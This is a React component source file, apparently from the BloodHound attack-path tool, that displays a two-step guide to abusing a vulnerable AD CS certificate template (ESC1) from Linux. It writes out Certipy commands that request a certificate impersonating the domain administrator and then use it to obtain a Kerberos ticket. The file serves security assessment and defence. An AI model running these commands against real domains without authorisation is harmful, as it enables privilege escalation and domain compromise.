// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Typography } from '@mui/material';

const LinuxAbuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>An attacker may perform this attack in the following steps:</Typography>
            <Typography variant='body2'>
                <b>Step 1</b>: Use Certipy to request enrollment in the affected template, specifying the target
                enterprise CA and target principal to impersonate:
            </Typography>
            <Typography component={'pre'}>
                {
                    'certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC1 -upn administrator@corp.local'
                }
            </Typography>
            <Typography variant='body2'>
                <b>Step 2</b>: Request a ticket granting ticket (TGT) from the domain, specifying the certificate
                created in Step 1 and the IP of a domain controller:
            </Typography>
            <Typography component={'pre'}>{'certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128'}</Typography>
        </>
    );
};

export default LinuxAbuse;
